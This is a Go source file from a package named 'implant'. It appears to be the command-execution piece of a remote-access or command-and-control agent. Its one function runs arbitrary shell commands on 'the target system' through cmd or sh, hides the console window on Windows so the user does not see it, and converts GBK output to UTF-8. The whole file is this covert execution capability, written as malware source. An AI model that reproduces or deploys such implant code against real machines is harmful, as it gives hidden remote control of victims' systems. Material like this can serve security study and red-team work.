package implant

import (
	"bytes"
	"context"
	"os/exec"
	"runtime"
	"syscall"
	"time"

	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

// ExecuteCommand runs a shell command on the target system.
// On Windows, it uses cmd /c. On Linux/macOS, it uses /bin/sh -c.
// Windows output is converted from GBK to UTF-8.
func ExecuteCommand(command string, timeoutSec uint32) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeoutSec)*time.Second)
	defer cancel()

	var cmd *exec.Cmd

	switch runtime.GOOS {
	case "windows":
		cmd = exec.CommandContext(ctx, "cmd")
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: 0x08000000, // CREATE_NO_WINDOW
			CmdLine:       `cmd /c ` + command,
		}
	default:
		cmd = exec.CommandContext(ctx, "/bin/sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()

	// Convert Windows GBK output to UTF-8
	if runtime.GOOS == "windows" && len(output) > 0 {
		output = gbkToUTF8(output)
	}

	if err != nil {
		if ctx.Err() != nil {
			return output, nil
		}
		return output, err
	}

	return output, nil
}

// gbkToUTF8 converts GBK-encoded bytes to UTF-8.
func gbkToUTF8(data []byte) []byte {
	reader := transform.NewReader(bytes.NewReader(data), simplifiedchinese.GBK.NewDecoder())
	var buf bytes.Buffer
	buf.ReadFrom(reader)
	return buf.Bytes()
}
